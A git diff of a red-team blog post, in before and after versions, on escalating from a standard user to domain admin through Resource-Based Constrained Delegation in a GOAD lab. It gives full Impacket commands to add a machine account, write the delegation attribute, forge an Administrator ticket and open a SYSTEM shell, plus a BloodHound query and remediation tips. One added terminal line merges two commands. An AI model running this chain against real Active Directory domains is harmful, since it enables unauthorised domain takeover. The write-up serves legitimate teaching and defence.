@@ -1,153 +1,155 @@
 ---
 layout: post
-title: "From GenericWrite to Domain Admin: Mastering Resource-Based Constrained Delegation (RBCD)"
+title: "Attack Path: Resource-Based Constrained Delegation (RBCD)"
 date: 2025-08-04 14:00:00 +0000
 categories: [active-directory, rbcd, privilege-escalation]
-tags: [red-team, kerberos, delegation, s4u, bloodhound]
-description: "A deep dive into exploiting Kerberos S4U extensions to escalate from a standard user to Domain Admin, and how to defend against it."
-image: /assets/img/rbcd-banner.jpg  # Optional: Add a banner image if your theme supports it
+tags: [red-team, kerberos, bloodhound]
+mermaid: true
 ---
 
-# Active Directory 101: Resource-Based Constrained Delegation (RBCD)
+<style>
+  /* Custom Styles for this Post */
+  .post-container { font-family: 'Segoe UI', sans-serif; }
+  
+  /* The "Card" look to replace lines */
+  .content-card {
+    background: #f8f9fa; /* Light grey background */
+    border-left: 5px solid #2c3e50; /* Dark blue accent */
+    padding: 20px;
+    margin-bottom: 30px;
+    border-radius: 0 8px 8px 0;
+    box-shadow: 2px 2px 10px rgba(0,0,0,0.05);
+  }
 
-**Complexity:** High | **Impact:** Critical | **Prevalence:** Common
+  /* Dark Mode Terminal Box */
+  .terminal-box {
+    background-color: #1e1e1e;
+    color: #00ff41; /* Hacker Green */
+    font-family: 'Consolas', 'Courier New', monospace;
+    padding: 15px;
+    border-radius: 5px;
+    border: 1px solid #333;
+    margin: 10px 0;
+    white-space: pre-wrap;
+    font-size: 0.9em;
+  }
 
----
+  /* Highlight Box for Key Concepts */
+  .concept-box {
+    background: #e3f2fd;
+    border: 1px solid #90caf9;
+    color: #0d47a1;
+    padding: 15px;
+    border-radius: 8px;
+    margin-bottom: 20px;
+  }
 
-## 🚀 The Elevator Pitch
-Resource-Based Constrained Delegation (RBCD) is one of the most elegant privilege escalation paths in Active Directory. Unlike traditional constrained delegation (which requires Domain Admin privileges to configure), RBCD can be configured by **anyone** with write permissions on a computer object.
+  /* Warning / Red Team Note */
+  .red-team-note {
+    background: #fff3e0;
+    border-left: 5px solid #ef6c00;
+    padding: 15px;
+    margin: 20px 0;
+    font-style: italic;
+  }
 
-For a Red Teamer, this means if you find a `GenericWrite` or `WriteProperty` on a target computer, you can trick Active Directory into letting you impersonate **Administrator** on that machine.
+  h1 { color: #2c3e50; font-weight: 800; border-bottom: none !important; }
+  h2 { color: #c0392b; font-weight: 700; margin-top: 0; }
+  h3 { color: #34495e; }
+</style>
 
+<div class="post-container">
 
-
----
-
-## 🧠 The Concept: How S4U Works
-To understand the exploit, we must understand the feature. RBCD relies on the **Kerberos Service-for-User (S4U)** extensions, specifically designed to allow services to request tickets on behalf of users.
-
-<div class="key-concept" markdown="1">
-**The "AllowedToAct" Attribute**
-
-Unlike classic delegation (configured on the *front-end* service), RBCD is configured on the *target* resource using the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. 
-
-It effectively says: *"I trust <u>Computer A</u> to authenticate users on my behalf."*
+<div class="content-card">
+  <h2>🚀 The Executive Summary</h2>
+  <p><strong>Resource-Based Constrained Delegation (RBCD)</strong> is a critical Active Directory misconfiguration that allows an attacker to escalate from a standard user to Domain Admin permissions.</p>
+  <p>Unlike traditional attacks that require high privileges, RBCD exploits a subtle permission: <strong>Write access on a computer object.</strong></p>
 </div>
 
-The magic happens in two steps:
-1.  **S4U2Self:** The attacker's controlled computer asks the KDC: *"I need a ticket for Administrator to access myself."* The KDC obliges.
-2.  **S4U2Proxy:** The attacker's computer presents that ticket and asks: *"Administrator is trying to access the Target Resource through me. Can I get a ticket for them?"*
-3.  **Result:** The KDC issues a valid Service Ticket for Administrator to the Target.
+<div class="content-card">
+  <h2>🧠 The Attack Concept</h2>
+  <div class="concept-box">
+    <strong>The Core Vulnerability:</strong><br>
+    The attribute <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> controls which services can impersonate users to a specific computer. If we can write to this attribute, we control who can access the machine.
+  </div>
 
-
-
----
-
-## 🔍 The Discovery: BloodHound
-The hardest part of this attack isn't the execution; it's the discovery. We are looking for a specific Access Control Entry (ACE).
-
-**What to look for:**
-* **Edge:** `GenericAll`, `GenericWrite`, `WriteProperty`, or `WriteOwner`.
-* **Target:** A Computer Object (The victim server).
-* **Source:** Any user you have compromised.
-
-<div class="bloodhound-note" markdown="1">
-**BloodHound Query:**
-`MATCH p=(u:User)-[r:GenericWrite|GenericAll|WriteDacl|WriteOwner]->(c:Computer) RETURN p`
+  <p>The attack relies on the <strong>Kerberos S4U (Service for User)</strong> extensions:</p>
+  
+  <div class="mermaid">
+  sequenceDiagram
+    participant Attacker as Attacker (EvilPC)
+    participant KDC as Domain Controller
+    participant Target as Target Server
+    
+    Note over Attacker: 1. S4U2Self
+    Attacker->>KDC: "I need a ticket for Administrator to access myself"
+    KDC-->>Attacker: TGS (Admin -> EvilPC)
+    
+    Note over Attacker: 2. S4U2Proxy
+    Attacker->>KDC: "Admin wants to access Target via me. Can I get a ticket?"
+    KDC-->>Attacker: TGS (Admin -> Target)
+    
+    Note over Attacker: 3. Execution
+    Attacker->>Target: Access as Administrator!
+  </div>
 </div>
 
-
-
----
-
-## ⚔️ The Kill Chain (Lab Demo)
-
-Let's walk through a live exploitation on a **GOAD (Game of Active Directory)** lab environment.
-
-**The Scenario:**
-* **Compromised User:** `stannis.baratheon`
-* **Target Server:** `KINGSLANDING$` (Domain Controller)
-* **Vulnerability:** Stannis has `GenericWrite` on the `KINGSLANDING` object.
-
-### Step 1: Establish a Foothold (The Fake Service)
-We need a service account to perform S4U operations. Since we don't have one, we will create one. By default, any authenticated user can join up to 10 machines to the domain (`MachineAccountQuota`).
-
-```bash
-# Create a controlled machine account "EVILCOMPUTER"
-proxychains addcomputer.py sevenkingdoms.local/stannis.baratheon:Drag0nst0ne \
-    -method LDAPS \
-    -computer-name EVILCOMPUTER$ \
-    -computer-pass EvilPass123!
-
-# Result: EVILCOMPUTER$ created successfully
-
-```
-
-### Step 2: Weaponize the Delegation
-
-Now we use our write primitive. We will modify the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to trust our new computer.
-
-```bash
-# Configure KINGSLANDING to trust EVILCOMPUTER
-proxychains rbcd.py sevenkingdoms.local/stannis.baratheon:Drag0nst0ne \
-    -delegate-from EVILCOMPUTER$ \
-    -delegate-to KINGSLANDING$ \
-    -action write
-
-```
-
-### Step 3: The Protocol Abuse (S4U)
-
-We request the ticket. We ask the KDC to let us impersonate `Administrator` from our evil computer to the target.
-
-```bash
-# Execute S4U2Self + S4U2Proxy
-proxychains getST.py sevenkingdoms.local/EVILCOMPUTER$:EvilPass123! \
-    -spn cifs/kingslanding.sevenkingdoms.local \
-    -impersonate Administrator \
-    -dc-ip kingslanding.sevenkingdoms.local
-
-# Output: Administrator.ccache saved
-
-```
-
-### Step 4: Execution
-
-With the ticket in hand, we access the target.
-
-```bash
-export KRB5CCNAME=Administrator.ccache
-
-# Pop a shell as SYSTEM
-proxychains wmiexec.py sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local \
-    -k -no-pass
-
-```
-
-<div class="success-box" markdown="1">
-**Pwned!** You have moved laterally from a standard user to Domain Admin on the DC.
+<div class="content-card">
+  <h2>🔍 Phase 1: Reconnaissance</h2>
+  <p>We use <strong>BloodHound</strong> to identify the vulnerability. We are looking for an edge that allows us to modify a computer object.</p>
+  <div class="red-team-note">
+    <strong>BloodHound Query:</strong><br>
+    MATCH p=(u:User)-[r:GenericWrite|GenericAll|WriteDacl]->(c:Computer) RETURN p
+  </div>
+  
 </div>
 
----
+<div class="content-card">
+  <h2>⚔️ Phase 2: Exploitation</h2>
+  <p><strong>Scenario:</strong> User <code>Stannis</code> has GenericWrite on <code>KINGSLANDING$</code> (DC).</p>
 
-## 🛡️ Remediation & Defense
+  <h3>Step A: Create the "Fake" Service</h3>
+  <p>We need a service account to interact with Kerberos. We use the default <code>MachineAccountQuota</code> to create one.</p>
+  <div class="terminal-box">
+$ proxychains addcomputer.py domain/stannis:Pass -method LDAPS -computer-name EVILPC$
+[+] EVILPC$ created successfully!
+  </div>
 
-As consultants, our job isn't just to break it, but to fix it. Here is how organizations can stop RBCD:
+  <h3>Step B: Weaponize the Target</h3>
+  <p>We write our new computer's name into the target's delegation attribute.</p>
+  <div class="terminal-box">
+$ proxychains rbcd.py domain/stannis:Pass -delegate-from EVILPC$ -delegate-to KINGSLANDING$ -action write
+[+] Attribute modified successfully.
+  </div>
 
-1. **Set MachineAccountQuota to 0:** Prevent users from creating the dummy computers needed for the attack.
-2. **Audit DACLs:** Regularly scan for dangerous permissions (Write/GenericAll) on Computer objects using tools like BloodHound or PingCastle.
-3. **Tiered Administration:** Ensure standard users never have permissions over Tier 0 (Domain Controller) assets.
+  <h3>Step C: The Kerberos Abuse</h3>
+  <p>We request the impersonation ticket (S4U2Self + S4U2Proxy).</p>
+  <div class="terminal-box">
+$ proxychains getST.py domain/EVILPC$:Pass -spn cifs/kingslanding -impersonate Administrator
+[*] Impersonating Administrator...
+[+] Saving ticket to Administrator.ccache
+  </div>
+</div>
 
----
+<div class="content-card" style="border-left-color: #27ae60;">
+  <h2 style="color: #27ae60;">🏁 Phase 3: Domain Dominance</h2>
+  <p>With the ticket in hand, we execute commands as <strong>SYSTEM</strong> on the Domain Controller.</p>
+  <div class="terminal-box">
+$export KRB5CCNAME=Administrator.ccache$ proxychains wmiexec.py domain/Administrator@kingslanding -k -no-pass
 
-## 🧰 Toolkit
+C:\Windows\system32> whoami
+nt authority\system
+  </div>
+</div>
 
-* **Discovery:** [BloodHound](https://github.com/SpecterOps/BloodHound)
-* **Exploitation:** [Impacket (rbcd.py, getST.py)](https://github.com/fortra/impacket)
-* **Alternative:** [Rubeus (C#)](https://github.com/GhostPack/Rubeus)
+<div class="content-card">
+  <h2>🛡️ Consultant's Corner: Remediation</h2>
+  <p>How do we advise clients to fix this?</p>
+  <ul>
+    <li><strong>Restrict MachineAccountQuota:</strong> Set it to 0 so users cannot create the "Fake Service."</li>
+    <li><strong>Tiered Administration:</strong> Ensure standard users do not have Write permissions on Tier 0 assets.</li>
+    <li><strong>Monitoring:</strong> Alert on changes to <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>.</li>
+  </ul>
+</div>
 
----
-
-*Disclaimer: This post is for educational purposes and cybersecurity research only. Always obtain written permission before testing on any network.*
-
-```
+</div>
